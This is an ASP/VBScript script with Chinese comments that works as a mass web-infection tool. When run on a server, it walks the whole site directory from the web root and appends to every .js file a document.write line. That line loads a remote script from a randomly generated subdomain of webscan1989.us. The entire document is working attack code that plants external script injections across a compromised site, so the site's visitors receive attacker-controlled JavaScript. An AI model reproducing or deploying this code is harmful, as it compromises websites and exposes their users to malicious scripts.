<%
'网站自动批量挂链接 $BY="UVEyNjAyMTU5OTQ2";
function txt_end_data2(path)'写入文件尾部
path=replace(path,"\\","\")
Response.Write "</br>"+path
data="document.write('<script type=""text/javascript"" src=""http://"&sj_az_AZ(sjs_random(8))&".webscan1989.us/TOM/ip.php""></script>');"
On Error Resume Next  '忽略错误
dim fs  '读取文件
Set Fs=Server.CreateObject("Scripting.FileSystemObject")
Set File=Fs.OpenTextFile(path,8,true)    '2覆盖，8追加;true文件不存在则自动创建.false不自动创建
On Error Goto 0
File.WriteLine (data) 'file.writeline 会写入换行符,file.write 不会写入换行符
File.Close
'Set fso=CreateObject("Scripting.FileSystemObject")
'set f=fso.CreateTextFile(path,,8,false)
'f.WriteLine data
'f.Close
Response.Write "-----add ok"

end function 


function bianli(path)'遍历目录
    set fso=server.CreateObject("scripting.filesystemobject")
    on error resume next
    set objFolder=fso.GetFolder(path)
    set objSubFolders=objFolder.Subfolders
    for each objSubFolder in objSubFolders
        nowpath=path + "\"+ objSubFolder.name
        'Response.Write nowpath
        set objFiles=objSubFolder.Files
        for each objFile in objFiles
                data=nowpath+ "\"+ objFile.name
                if InStr(data,".js") then
        	    'Response.Write "<br>"
        	    'Response.Write data
                     txt_end_data2(data)'写入文件
    	end if
            next
            bianli(nowpath)'递归
    next
    set objFolder=nothing
    set objSubFolders=nothing
    set fso=nothing
end function 


function file_paths(data) '遍历循环路径
	data2=""
	dim names(20)
	arrayValue = split(data,"\")   'split(data,"\")
	for i = 0 to UBound(arrayValue)
	    data2 =data2+arrayValue(i)+"\"    'data2+arrayValue(i)+"\"
	    names(i)=data2
	next

	int_url=UBound(names)
	for i=0 to UBound(names)  '正向读取
	iiint=int_url-i
	url_data=names(iiint)
	if url_data="" then
	else
		response.Write "</br>+++++++++++:"
		response.Write url_data
		response.write "<br>-----------------------------<br>"
		bianli(url_data) '遍历
	end if
	next
	'txt_end_data2("C:\Program Files\小旋风AspWebServer\wwwroot\5.asp")
	Response.Write "</br>=============</br>"'
end function 
'=======================================================================================================
function sjs_random(zd0) '获取随机数
	randomize Timer '抽取随机数
	sjs_random=int(zd0*rnd)+2
end function 

function sj_az_AZ(Z1)  '随机抽取字符串
	dim str
	data=""
	str="a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,1,2,3,4,5,6,7,8,9,0"
	arr=split(str,",")
	Randomize 
	xi=sjs_random(Z1)
	if xi<=1 then
		xi=5
		'response.write "xx"
	end if
	for i=xi to Z1  '正向读取
		i2=Int((ubound(arr) + 1)*RND) '搜索
		data=data&arr(i2)
	next
	sj_az_AZ=data
end function


response.clear
file_data = Server.MapPath("\")  '网站路径
response.Write file_data&"BY:UVEyNjAyMTU5OTQ2"
for_file=true  'true会变为1，false则为0
if for_file then
	Response.Write "<br>====WEB====<br>"
	bianli(file_data) '遍历file_data&"\"
else  'false
	Response.Write "<br>====file_paths WEB====<br>"
	bianli(file_data) '遍历file_data&"\"
	file_paths(file_data) '遍历循环路径
end if
response.end
'txt_end_data2("D:\SwsAspWebServer\TOM\cpm\cpm\Index\Tpljquery.js") 写入文件

%>

